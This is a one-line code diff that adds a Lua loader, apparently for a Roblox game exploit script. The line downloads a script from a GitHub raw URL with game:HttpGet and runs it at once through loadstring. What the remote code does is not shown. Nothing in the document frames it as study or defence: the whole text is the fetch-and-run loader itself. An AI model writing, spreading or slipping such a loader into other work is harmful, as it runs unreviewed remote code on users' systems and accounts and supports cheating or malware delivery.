@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/drive-a-tuk-tuk-spam0-f6x3jn5ngh5vda.lua"))()
